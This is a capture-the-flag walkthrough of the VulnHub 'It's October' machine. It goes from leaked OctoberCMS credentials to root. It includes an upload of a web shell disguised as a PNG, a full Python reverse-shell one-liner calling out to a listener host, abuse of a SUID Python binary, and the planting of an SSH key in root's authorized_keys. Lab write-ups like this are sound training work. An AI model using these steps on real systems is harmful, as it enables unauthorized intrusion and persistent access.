# It's October

https://www.vulnhub.com/entry/its-october-1,460/

## Recon

Nmap revealed:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
```

The mysql service didn't allow login remotely. Port 80 showed a brochureware site, with nothing much on it.

Port 8080 revealed a site called 'my notes', with a full screen jpeg containing no information. A look at the source revealed a commented out `mynote.txt` which when browsed to, revealed:

```
user 		- admin
password 	- adminadmin2 
```

This didn't work via the ssh connection (which is wired to use ssh certs only, not username/password). However, a quick `dirb` on the port 80 website revealed a `/backend`, which provided a login screen for something called OctoberCMS. The creds worked here :)

## October CMS

Once inside, I browsed around. There were asset links that allowed uploading files, but restricted extensions to a safe whitelist. I found the version from `/backend/system/updates`, and a search showed that while prior versions had an upload filter bypass, the current version did not.

Checking the logs I saw a couple of old errors that looked like this:

`ErrorException: Use of undefined constant hi - assumed 'hi' (this will throw an Error in a future version of PHP) in /var/www/html/octobercms/plugins/rv/phpconsole/controllers/ScriptsController.php(41) : eval()'d code:1`

phpconsole sounded interesting...I did a search and its an OctoberCMS plugin. It didn't seem to be installed, however the interface allowed me to search for and install it, easy peasy!

The interface permitted me to execute arbitary php code, including system. `system("whoami");` revealed www-data. I tried a few ways to get a reverse shell, but it appeared that the system could not call out via this interface.

The whitelist from before blocked extensions, but didn't check content of files. Therefore I did the following:

1. uploaded a shell with a .png extension (I used [p0wny-shell](https://github.com/flozz/p0wny-shell))
2. used the php sandbox to mv and rename the shell into the 'notepad' website (which I already had discovered was at `/var/www/html/notepad`):

    `system('mv themes/vojtasvoboda-newage/assets/shell.php.png /var/www/html/notepad/shell.php');`
    
3. browsed to :8080/shell.php

Nice.

> Note: the p0wny shell is limited in that you can't do interactive, stdin type stuff. No mysql (as discussed next) or python (as discussed later). However it does have some advantages: its a web page, with some cleverness, so arrow keys work great as does tab completion (both of which print character codes instead of working with reverse NC). It also preserves history, which is real nice.

## Enumeration

Browsing around I found a /armour user and home folder with nothing in it. Not much else.

I decided to browse the octobercms folders and found a /config/database.php file, which revealed the local mysql instance had a nice `root`/`root` username/password on it. A quick look at the tables revealed little that stood out (since p0wny is not interactive I couldn't open the mysql cli - instead I had to execute on the same line: `mysql -u root -proot -e "select TABLE_SCHEMA, table_name from information_schema.tables"`). The user tables just contained the root user I already had.

At this point things got slower. I did a lot of enumeration, carefully examining things piece by piece. Nothing of note seemed to be running under cron, the webservers were all www-data, I could see inside the sole /home folder (/home/armour) but there was nothing in it. sudo wasn't present, netcat wasn't precent, /dev/tcp wasn't there. Tough.

Eventually I found it! But it was tricky: one of the first things I ran when I discovered no `sudo -l` was `find / -perm -u=s -type f 2>/dev/null`; basically it looks for files with the suid bit set, starting from the root. But it returned nothing. Without that `2>/dev/null` it was cancelled pretty early due to permission failure. A day later, as part of a slow re-examination, I instead ran `find / -perm -u=s -type f -maxdepth 3 2>/dev/null`; see the maxdepth flag? Well this prevented it crashing, and returned:

```
/usr/bin/newgrp
/usr/bin/su
/usr/bin/python3.7m
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/umount
/usr/bin/python3.7
/usr/bin/gpasswd
```

Python jumps out there. Doing a `ls -lA /usr/bin/python*` returns:

```
lrwxrwxrwx 1 root root       9 Mar 26  2019 /usr/bin/python3 -> python3.7
-rwsr-xr-x 2 root root 4877888 Dec 20 13:18 /usr/bin/python3.7
-rwsr-xr-x 2 root root 4877888 Dec 20 13:18 /usr/bin/python3.7m
lrwxrwxrwx 1 root root      10 Mar 26  2019 /usr/bin/python3m -> python3.7m
```

So...python3.7 rusn as root. Interesting...

## Improving my shell

The problem was that `python3.7 -c "import os; os.system('whoami')"` returned `www-data` still. I thought that what this meant was that python drops priveleges with the -c command. This is **not true**, but I didn't discover that until later.

What I thought I needed was to open python interactively, and my p0wny shell wouldn't let me do that. So how to upgrade?

`nc` wasn't there, neither was `/dev/tcp`. However, I had python obviously, so I used a oneliner from here: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet. Specifically (replacing the IP and port as appropriate):

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This connected to a nc listener running on kali, at which point I used the standard `python -c "import tty; tty.spawn('/bin/bash')"` to get a proper shell. From that I was open python3.7 interactively.

## SSH and Victory

Interactively, I still got dropped privileges from os.system. However, regular python stuff worked fine. To test, I used:

```
>>> fn = open("/home/armour/test.txt", "w");
fn = open("/home/armour/test.txt", "w");
>>> fn.write("hello world");
fn.write("hello world");
11
>>> fn.close();
fn.close();
```

Browsing to that folder with p0wny shell, I could see the file was created and contained my content. Ok, great! I'm root!

> After I finished the whole VM I came back and tested using the p0wny shell without my upgraded reverse shell whether this worked: `/usr/bin/python3.7 -c "fn = open('/home/armour/test2.txt', 'w'); fn.write('test'); fn.close();"`. It worked fine, so the upgraded shell was entirely unnecessary. However, learning how to do one with python and having that one liner resource page in general is quite nice.

Next step was to check the contents of `/root`:

```
>>> import os;
>>> os.listdir("/root");
['.bash_history', '.config', '.htaccess', 'proof.txt', '.bashrc', '.viminfo', '.wget-hsts', '.mysql_history', '.profile', '.python_history', '.gnupg', '.vim', '.ssh']
>>>
```

Nice. I guessed that proof.txt was the root flag, but this still felt a bit janky. Could I become root through ssh? Yes I could.

I used the following commands to interroage .ssh, and inject my public key:

```
>>> os.listdir("/root/.ssh");
['authorized_keys']
>>> fn = open("/root/.ssh/authorized_keys", "r");
>>> text = fn.read();
>>> fn.close();
>>> print(text);
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDh8yJoDAF1hceV9ogf+lsz4AJ+xeSYF8zf4qPbxboWITAwlIxAllAZuhKxEPdkRl66GV2r3mgk7mfSgjqoFPUYuYJBFACq65FYx91bpnDMEiGIEoK+gu8SIi3cQbtWAvMCSKNQGXIPdmYttB+A83vsUMV9X8runDqKpTbEi6HM9G740euAUsDNDmUR5EaCK2ze+x9D6pB2044ui+5wb6HBj5ZF+eEV9Gt66nGOHmuvsuqSqHVGIqGmk0lIBoCDzfWticp/bkesx96nbqTB9VvdvsaGdOx34gAhYlu4y6zHkF9MKuiscAH4dks7SaFkneMTC8rGF8XuLOa5RmJPg/zj root@AI

>>> n = open("/root/.ssh/authorized_keys", "a");    
>>> n.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3EHHpGN4HnZmiGLbSoMeLpQorgqFvCb9LXCv4XXK/PtvJ6PNmk0S8tCO7iaL1WOTbj8Wc/g4cbNmAi3X5Sk41pu9McZcX+8KLN4md9LOVvPTPT3e6jmKOfAAdd0YdLoTVNSKUyOKe0RjvAaGfvQ5ciqGF1nB33qW72JJ07ZEq5PdwI41lndQaKyn+acD1xJXlDRhj0ngsESSdBzGrDaPrWkYtbsROtU76Lgg7UrEDivJ7suGb01l9N0tE8Ooxu3OI1e9CwlKolydfvqJkdVk6K/i2Ox73nDO+zXe5THSqsXzVvoBwKy2VuDe/B6BNBqTGpy14WJl5tHlqAPfoF1ZFV6KH8iicKYEdqccovq3/Z5Io26ru6Go3rXqHr8FReagyJb3Poj9uty5zp713D4NAv3hMKc1+LeEyEzioGGM6aVEmUqric1EGwvv5s88UE9kMlMOXjgoxoaxMRmSF5WWKKVlnN2HuqhAbjAb5xuYfj2n+ObFjLHD6B05IuCHafg8= kali@kali");
<HuqhAbjAb5xuYfj2n+ObFjLHD6B05IuCHafg8= kali@kali");
562
>>> n.close();
>>> 
```

And then I tried ssh'ing in:

```
ssh root@192.168.1.205
The authenticity of host '192.168.1.205 (192.168.1.205)' can't be established.
ECDSA key fingerprint is SHA256:DYZkjGYMu99f1Ml7F6XHJ+4Oh/GISu41/GP0Y+yMgpg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.205' (ECDSA) to the list of known hosts.
   ##############################################################################################
   #                                      Armour Infosec                                        #
   #                         --------- www.armourinfosec.com ------------                       #
   #                                    It's October                                            #
   #                               Designed By  :- Akanksha Sachin Verma                        #
   #                               Twitter      :- @akankshavermasv                             #
   ##############################################################################################

                                       IP:\4
                                       Hostname: \n

Debian GNU/Linux 10
Linux october 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Mar 27 10:53:25 2020 from 192.168.1.6
root@october:~#
```

Perfect! RIP vm, as they say:

```
root@october:~# cat proof.txt 
Best of Luck
$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq
root@october:~#
```
